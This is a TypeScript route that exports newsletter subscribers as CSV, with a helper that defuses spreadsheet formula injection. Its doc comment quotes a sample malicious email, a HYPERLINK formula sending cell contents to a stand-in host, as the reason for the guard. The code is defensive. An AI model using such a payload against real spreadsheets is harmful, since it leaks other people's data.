/**
 * Quote a CSV cell, and defuse spreadsheet formulas.
 *
 * Quoting and doubling inner quotes is correct CSV and is NOT a mitigation:
 * Excel and LibreOffice evaluate a QUOTED cell whose content begins with =, +,
 * - or @. The email regex on the signup form accepts all four, so a visitor
 * could subscribe as `=HYPERLINK("https://evil.tld/?d="&A1,"Open")@x.co` and
 * the creator's own spreadsheet would exfiltrate neighbouring cells when they
 * clicked it. A leading apostrophe is the conventional escape and is stripped
 * by every spreadsheet on import.
 */
function csvCell(value: string): string {
  const needsGuard = /^[=+\-@\t\r]/.test(value);
  const cell = needsGuard ? `'${value}` : value;
  return `"${cell.replace(/"/g, '""')}"`;
}

import { getCurrentUser } from "@/lib/auth";
import { getLeads, getSiteByUser } from "@/lib/db";
import { planFor } from "@/lib/billing";

export async function GET(): Promise<Response> {
  const user = await getCurrentUser();
  if (!user) return new Response("Unauthorized", { status: 401 });
  const site = getSiteByUser(user.id);
  if (!site || !planFor(site).newsletter) return new Response("Forbidden", { status: 403 });

  // Status included so an import into a real ESP can honour opt-outs.
  const rows = [
    ["email", "subscribed_at", "status"],
    ...getLeads(site.id).map((l) => [l.email, l.createdAt, l.unsubscribedAt ? "unsubscribed" : "subscribed"]),
  ];
  const csv = rows.map((r) => r.map(csvCell).join(",")).join("\r\n");

  return new Response(csv, {
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="${site.slug}-subscribers.csv"`,
      "Cache-Control": "no-store",
    },
  });
}
